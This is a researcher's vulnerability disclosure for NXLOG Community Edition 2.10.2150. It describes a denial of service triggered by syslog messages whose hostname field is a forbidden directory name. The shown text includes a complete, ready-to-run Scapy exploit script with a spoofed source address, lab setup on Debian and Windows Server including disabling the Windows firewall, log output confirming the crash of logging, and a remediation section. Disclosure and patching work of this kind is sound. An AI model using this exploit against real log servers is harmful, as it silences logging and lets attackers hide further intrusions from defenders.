I have found a vulnerability in product: **nxlog-ce_2.10.2150**.
I have tested my PoC only on Linux (Debian 10) and Windows (Windows Server 2016).

---

# 1 Description :
**Scope 			:** 		NXLOG Community Edition 2.10.2150

**Bug Type 			:** 		CWE-502, Deserialization of Untrusted Data [https://cwe.mitre.org/data/definitions/502.html](https://cwe.mitre.org/data/definitions/502.html)

**Vulnerable part 	:**			Syslog payload

**Payload 			:**

* Unix : 	Sep 14 14:09:09 **..** dhcp service[warning] 110 Silence is golden
* Windows : Sep 14 14:09:09 **CON** dhcp service[warning] 110 Silence is golden

---

MY CVSS COMPUTING :

**Attack Vector 		:** 	Network

**Priviles Required 	:**		None

**Scope 				:**		Unchanged

**Integrity 			:**		None

**Attack Complexity 	:**		Low

**User Interaction 		:**		None

**Confidentiality 		:**		None

**Availability 			:**		High

---

**CVSS SCORE 			:** 	7.5

**SEVERITY				:**		HIGH


---

CVSS COMPUTING FROM NIST :
Link : https://nvd.nist.gov/vuln/detail/CVE-2020-35488

**Attack Vector         :**     

**Priviles Required     :**     

**Scope                 :**     

**Integrity             :**     

**Attack Complexity     :**     

**User Interaction      :**     

**Confidentiality       :**     

**Availability          :**     

---

**CVSS SCORE (3.X)      :**    7.5

**SEVERITY              :**    HIGH


---

# 2 Exploitation :
This vulnerability can make a DoS of NXLOG server.

But the server needs to be a specific configuration, the nxlog config file must define to create a directory with a field of a part of the Syslog payload.

Syslog field: [https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_fields](https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_fields)

The software tries to create a directory but the name of this directory can't be created on the file system.

Because of the name of this directory is forbidden.

Here is an example of a directory name impossible to create :

* For Windows 	: 	CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 et LPT9;
* For Linux 	:	.., .

So if the configuration file is defined to create a name directory with Syslog payload, an attacker can switch off the Nxlog service.

---

# 3 PoC :
To exploit this vulnerability I have created a Python script :
````python
#!/usr/bin/python3
# coding: utf8
# Nooooooooooo I'm not a script kiddie I hack syslog :D
# g0 h4ck SYSLOG
# Made by 123soleil with <3

import sys
import time
import argparse
from scapy.all import *

def getPayload(args):
        # IF UNIX
        if (args.OS == 1):
                return "Sep 14 14:09:09 .. dhcp service[warning] 110 Silence is golden"
        # IF WINDOWS
        elif (args.OS == 2):
                return "Sep 14 14:09:09 CON dhcp service[warning] 110 Silence is golden"

        # Test
        elif (args.OS == 3):
                return "Sep 14 14:09:09 123soleil dhcp service[warning] 110 Silence is golden"

def runExploit(args,payload):
        priority = 30
        message = payload
        syslog = IP(src="192.168.1.10",dst=args.IP)/UDP(sport=666,dport=args.PORT)/Raw(load="<" + str(priority) + ">" + message)
        send(syslog,verbose=args.DEBUG)

def getArguments():
        parser = argparse.ArgumentParser(description="Go h@ck SYSLOG")
        parser.add_argument("-ip", "-IP", dest="IP", type=str, metavar="IP destination", required=True,default=1, help="IP of NXLOG server")
        parser.add_argument("-p", "-P", dest="PORT", type=int, metavar="Port destination", required=False,default=514, help="Port of NXLOG default 514")
        parser.add_argument("-os", "-OS", dest="OS", type=int, metavar="OS", default=1, required=True, help="1 : For unix payload \n 2 : For Windows Paylaod \n 3 : Just for test")
        parser.add_argument("-d", "-D", dest="DEBUG", type=int, metavar="DEBUG", default=0, required=False, help="1 : Debbug enable")
        return parser.parse_args()

def main():
        args = getArguments()
        payload = getPayload(args)
        runExploit(args,payload)
main()
````

---

## 2.1 Linux :
### 2.1.1 Install :

Install Nxlog service on Debian 10 :
````bash
apt-get install libapr1 libdbi1 libssl1.1 multiarch-support

cd /tmp
wget http://ftp.de.debian.org/debian/pool/main/p/perl/libperl5.24_5.24.1-3+deb9u7_amd64.deb
wget http://security.debian.org/debian-security/pool/updates/main/o/openssl1.0/libssl1.0.2_1.0.2u-1~deb9u2_amd64.deb
wget http://ftp.de.debian.org/debian/pool/main/g/glibc/libc-bin_2.28-10_amd64.deb
wget http://ftp.de.debian.org/debian/pool/main/m/man-db/man-db_2.8.5-2_amd64.deb
wget http://ftp.de.debian.org/debian/pool/main/p/perl/perl-modules-5.24_5.24.1-3+deb9u7_all.deb
wget http://cz.archive.ubuntu.com/ubuntu/pool/main/g/gdbm/libgdbm3_1.8.3-13.1_amd64.deb
wget https://nxlog.co/system/files/products/files/348/nxlog-ce_2.10.2150_debian_stretch_amd64.deb

dpkg -i libc-bin_2.28-10_amd64.deb
dpkg -i libgdbm3_1.8.3-13.1_amd64.deb
dpkg -i perl-modules-5.24_5.24.1-3+deb9u7_all.deb
dpkg -i libperl5.24_5.24.1-3+deb9u7_amd64.deb
dpkg -i libssl1.0.2_1.0.2u-1~deb9u2_amd64.deb
dpkg -i man-db_2.8.5-2_amd64.deb
dpkg -i nxlog-ce_2.10.2150_debian_stretch_amd64.deb
````

Configuration file of nxlog service :
````bash
cat /etc/nxlog/nxlog.conf
````

````text
########################################
# Global directives                    #
########################################
User nxlog
Group nxlog

LogFile /var/log/nxlog/nxlog.log

########################################
# Modules                              #
########################################
<Extension _syslog>
    Module      xm_syslog
</Extension>

<Extension _exec>
    Module      xm_exec
</Extension>

<Extension _fileop>
    Module      xm_fileop
</Extension>

<Input udp>
    Module      im_udp
    Host        0.0.0.0
    Port        514
    Exec        parse_syslog_bsd();
</Input>

<Output file>
    Module      om_file
    CreateDir   True
    File        "/var/log/nxlog/"+ $Hostname +"/"+ $Hostname +".log"
</Output>

########################################
# Routes                               #
########################################
<Route syslog_to_file>
    Path        udp => file
    Priority    1
</Route>
````

Start the Nxlog service :
````bash
systemctl start nxlog
systemctl status nxlog
````

Return :
````text
● nxlog.service - LSB: logging daemon
   Loaded: loaded (/etc/init.d/nxlog; generated)
   Active: active (running) since Sun 2020-11-29 17:58:48 CET; 3min 1s ago
     Docs: man:systemd-sysv-generator(8)
    Tasks: 7 (limit: 2330)
   Memory: 1.7M
   CGroup: /system.slice/nxlog.service
           └─1323 /usr/bin/nxlog

nov. 29 17:58:47 DEB-TEST systemd[1]: Starting LSB: logging daemon...
nov. 29 17:58:48 DEB-TEST nxlog[1312]: Starting nxlog daemon...nxlog started!
nov. 29 17:58:48 DEB-TEST nxlog[1312]: .
nov. 29 17:58:48 DEB-TEST systemd[1]: Started LSB: logging daemon.
````

Check :
````bash
lsof -i :514
````

Return :
````
nxlog   1323 nxlog   18u  IPv4  21321      0t0  UDP localhost:syslog
nxlog   1323 nxlog   19u  IPv4  21324      0t0  TCP localhost:shell (LISTEN)
````

Ok great !

---

### 2.1.2 Test :
With my python script, I can just send a Syslog message to test if the Nxlog service creates a directory. 

The name of the directory is based on the **HOSTNAME** field of the Syslog payload. (See configuration file)

So :
````bash
./syslog-exploit.py -ip 192.168.1.55 -os 3
````

The third option specifies **123soleil** hostname in Syslog payload.

So :
````bash
ls /var/log/nxlog
123soleil  nxlog.log

cat /var/log/nxlog/123soleil/123soleil.log
<30>Sep 14 14:09:09 123soleil dhcp service[warning] 110 Silence is golden
````

Ok, Nxlog server and Syslog client work !

---

### 2.1.3 Exploit :

Now if I specify a hostname with a forbidden name :
````bash
./syslog-exploit.py -ip 192.168.1.55 -os 1
````

In Nxlog internal log :
````bash
cat /var/log/nxlog/nxlog.log
````

Return :
````text
2020-11-29 18:11:04 INFO nxlog-ce-2.10.2150 started
2020-11-29 18:15:12 ERROR failed to open /var/log/nxlog/../...log;Permission denied
````

All new logs sent by Syslog clients will no longer be written to the filesystem. 

Because the nxlog service is in an unknown state because it tries to create a directory that cannot be created.

For illustrate, if I try to send a new Syslog payload to the server I have this log in the internal log :
````text
2020-11-29 18:11:04 INFO nxlog-ce-2.10.2150 started
2020-11-29 18:15:12 ERROR failed to open /var/log/nxlog/../...log;Permission denied
2020-11-29 18:18:38 ERROR last message repeated 3 times
````

I have test this exploit with all methods available :

* parse_syslog();
* parse_syslog_bsd();
* parse_syslog_ietf();

And with all methods exploit work !

Sources:

* [https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_proc_parse_syslog](https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_proc_parse_syslog),
* [RFC 3164](https://tools.ietf.org/html/rfc3164)
* [RFC 5424](https://tools.ietf.org/html/rfc5424)

---

## 2.2 Windows :
### 2.1.1 Install :
Install link : 
[https://nxlog.co/system/files/products/files/348/nxlog-ce-2.10.2150.msi](https://nxlog.co/system/files/products/files/348/nxlog-ce-2.10.2150.msi)

Nxlog configuration file :
````text
########################################
# Global directives                    #
########################################
define ROOT     	C:\Program Files (x86)\nxlog
define CERTDIR  	%ROOT%\cert
define CONFDIR  	%ROOT%\conf
define LOGDIR   	%ROOT%\data
define LOGFILE  	%LOGDIR%\nxlog.log
LogFile 			%LOGFILE%

Moduledir          	%ROOT%\modules
CacheDir       		%ROOT%\data
Pidfile         	%ROOT%\data\nxlog.pid
SpoolDir          	%ROOT%\data

########################################
# Modules                              #
########################################
<Extension _syslog>
    Module      	xm_syslog
</Extension>

<Extension _exec>
    Module			xm_exec
</Extension>

<Extension _fileop>
	Module			xm_fileop
</Extension>

<Input udp>
	Module 			im_udp
	Host    		0.0.0.0
	Port			514
	Exec			parse_syslog();
</Input>

<Output file>
	Module			om_file
	CreateDir		TRUE
	File			'%LOGDIR%' + '\' + $Hostname + '\' + $Hostname + '.log'
</Output>

########################################
# Routes                               #
########################################
<Route syslog_to_file>
	Path			udp => file
	Priority 		1
</Route>
````

Start the Nxlog service :
````powershell
Start-Service -Name "nxlog"
Get-Service -Name "nxlog" 
````

Return :
````text
Status   Name               DisplayName
------   ----               -----------
Running  nxlog              nxlog
````

Check :
````powershell
netstat -an | Select-String "514" 
````

Return :
````
  UDP    0.0.0.0:514            *:* 
````

Ok great !

Disable Windows Firewall, because I don't want to create a Firewall rule... :
````powershell
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
````

---

### 2.1.2 Test :
With my python script I can just send a Syslog message for test if Nxlog service create directory. 

The name of directory is based on the **HOSTNAME** field of the Syslog payload. (See configuration file)

So :
````bash
./syslog-exploit.py -ip 192.168.1.54 -os 3
````

Directory and log are created :
````powershell
ls "C:\Program Files (x86)\nxlog\data\"
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       29/11/2020     19:31                123soleil
-a----       29/11/2020     19:52            257 nxlog.log

ls "C:\Program Files (x86)\nxlog\data\123soleil"
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       29/11/2020     19:31             75 123soleil.log 

cat "C:\Program Files (x86)\nxlog\data\123soleil\123soleil.log"
<30>Sep 14 14:09:09 123soleil dhcp service[warning] 110 Silence is golden
````


---

### 2.1.3 Exploit :
Now if I specify a hostname with a forbidden name :
````bash
./syslog-exploit.py -ip 192.168.1.54 -os 2
````

In Nxlog internal log :
````bash
cat 'C:\Program Files (x86)\nxlog\data\nxlog.log' 
````

Return :
````text
2020-11-29 19:30:57 INFO nxlog-ce-2.10.2150 started
2020-11-29 19:50:45 ERROR CreateDir is TRUE but couldn't create directory: C:\Program Files (x86)\nxlog\data\CON; Invalid directory name.
````

All new logs sent by Syslog clients will no longer be written to the filesystem. 

Because the nxlog service is in an unknown state because it tries to create a directory that cannot be created.

For illustrate, if I try to send a new syslog payload to server I have this log in internal log :
````text
2020-11-29 19:30:57 INFO nxlog-ce-2.10.2150 started
2020-11-29 19:50:45 ERROR CreateDir is TRUE but couldn't create directory: C:\Program Files (x86)\nxlog\data\CON; Invalid directory name.
2020-11-29 19:52:48 ERROR last message repeated 3 times
````

I have test this exploit with all methods available :

* parse_syslog();
* parse_syslog_bsd();
* parse_syslog_ietf();

And with all methods exploit work !

Source :

* [https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_proc_parse_syslog](https://nxlog.co/documentation/nxlog-user-guide/xm_syslog.html#xm_syslog_proc_parse_syslog),
* [RFC 3164](https://tools.ietf.org/html/rfc3164)
* [RFC 5424](https://tools.ietf.org/html/rfc5424)

---

# 4 Risk :
A hacker can switch off Nxlog service and he can attack IT infrastructure without any proof of this attack.


# 5 Remediation :
## 5.1 For Nxlog :
I have found the source code of NXLOG 2.10.2150 on your website :
[https://nxlog.co/system/files/products/files/348/nxlog-ce-2.10.2150.tar.gz](https://nxlog.co/system/files/products/files/348/nxlog-ce-2.10.2150.tar.gz)

And I have identified this method in **om_file.c** :
````c
static void om_file_create_dir(nx_module_t *module, const char *filename)
{
    char pathname[APR_PATH_MAX + 1];
    char *idx;
    apr_pool_t *pool;

    ASSERT(filename != NULL);

    idx = strrchr(filename, '/');
#ifdef WIN32
    if ( idx == NULL ) 
    {
        idx = strrchr(filename, '\\');
    }
#endif

    if ( idx == NULL )
    {
	log_debug("no directory in filename, cannot create");
	return;
    }

    pool = nx_pool_create_child(module->pool);
    ASSERT(sizeof(pathname) >= (size_t) (idx - filename + 1));
    apr_cpystrn(pathname, filename, (size_t) (idx - filename + 1));
    
    CHECKERR_MSG(apr_dir_make_recursive(pathname, APR_OS_DEFAULT, pool), 
		 "CreateDir is TRUE but couldn't create directory: %s", pathname);
    log_debug("directory '%s' created", pathname);
    apr_pool_destroy(pool);
}
````

You need to add in **om_file_create_dir** a check of the directory name.
Ressource :

* [What characters are forbidden in Windows and Linux directory names?.](https://stackoverflow.com/questions/1976007/what-characters-are-forbidden-in-windows-and-linux-directory-names#:~:text=Under%20Linux%20and%20other%20Unix,%27%5C0%27%20and%20slash%20%27%2F%27%20.)

You use **apr_dir_make_recursive** function to create the directory, this function is included in Apache Portable Projet.
[APR](http://apr.apache.org)

Please check the version you use in your binary.

Checking the public PoC does not allow for another exploit (ex. RCE).

References :

* [https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-17804/Apache-Portable-Runtime.html](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-17804/Apache-Portable-Runtime.html)
* [https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-17508/Apache-Apr-util.html](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-17508/Apache-Apr-util.html)

---

## 5.2 For IT Staff :
Do not use these features until Nxlog has deployed an official patch for the community versions.
